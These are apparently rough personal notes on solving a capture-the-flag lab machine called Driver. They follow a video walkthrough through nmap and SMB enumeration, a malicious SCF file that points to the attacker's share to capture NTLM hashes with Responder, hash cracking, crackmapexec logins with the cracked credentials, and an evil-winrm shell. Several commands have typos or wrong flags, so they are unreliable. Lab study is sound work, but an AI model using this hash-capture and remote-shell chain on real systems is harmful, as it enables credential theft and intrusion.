https://www.youtube.com/watch?v=N2ahkarb-zI&list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn

## nmap scan

sudo nmap -sC -sV -oA nmap/driver 10.10.11.106

port 80, 135

## smbclient

smbclient -L //10.10.11.106 - default

smbclient -N -L //10.10.11.106 - no password

smbclient -U '' -L //10.10.11.106

smbclient -U '.' -L //10.10.11.106

cme smb 10.10.11.106

# looking at website

admin 
admin

notice - url ends at .php

gobuster dir -u http://10.10.11.10 -U admin -P admin -x php -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out

# creaitng an scf file

vi attack.scf
```
[Shell]
Command=2
IconFile=10.10.6.12\share\anything_here
[Taskbar]
Command=ToggleDesktop
```

need to use responder.

6.37

using responder.py successfuly got th entlm hashes which were put in hashcat and cracked

after gettting smb credentials login

login using

cme smb -U tony -p liltony

then looking for winrm 
winrm ports are 5985, 5986 etc

so we use smb with winrm

cme winrm 10.10.11.106 -u tony -p liltony

however this worked for me

```
~/Downloads ⌚ 13:58:17
$ crackmapexec smb 10.10.11.106 -u tony -p liltony
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 

```

gives you shell :

```
~ ⌚ 14:28:35
$ ./evil-winrm-3.4/evil-winrm.rb -i 10.10.11.106 -u tony -p liltony -s scripts/ -e execs/

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> 

```

upload winpeas into the system

then we use metasploit to get a shell.





